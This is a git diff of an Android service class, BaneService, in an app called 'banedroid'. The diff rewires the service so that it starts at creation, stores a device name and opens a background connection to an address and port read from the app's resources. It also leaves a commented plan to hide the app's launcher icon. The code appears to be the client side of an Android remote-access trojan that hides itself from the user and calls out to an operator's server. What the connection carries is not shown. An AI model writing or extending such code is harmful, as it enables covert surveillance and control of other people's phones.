@@ -1,4 +1,4 @@
-package com.example.banedroid.bane;
+package com.example.banedroid.service;
 
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -9,10 +9,10 @@ import android.content.pm.PackageManager;
 import android.os.IBinder;
 import androidx.annotation.RequiresApi;
 import com.example.banedroid.MainActivity;
-import com.example.banedroid.connection.ConnectionInitializer;
-import com.example.banedroid.storage.Storage;
-import com.example.banedroid.storage.StorageException;
-import java.util.Date;
+import com.example.banedroid.R;
+import com.example.banedroid.connection.Connection;
+import com.example.banedroid.bane.storage.Storage;
+
 import java.util.Objects;
 
 // TODO: diableLauncherIcon
@@ -24,12 +24,12 @@ public class BaneService extends Service {
         super.onCreate();
         context = this;
         Storage storage = new Storage(this);
-        String name = "Unknown " + new Date();
+        String name = "stecco";//"Unknown " + new Date();
         if(!storage.isStored("name"))
             storage.set("name",name);
         else
             name = storage.get("name",name);
-        new Thread(new ConnectionInitializer(name)).start();
+        new Thread(Connection.Connection(name,BaneService.context.getResources().getString(R.string.address),Integer.parseInt(BaneService.context.getResources().getString(R.string.port)))).start();
         //disableLauncherIcon();
     }
 
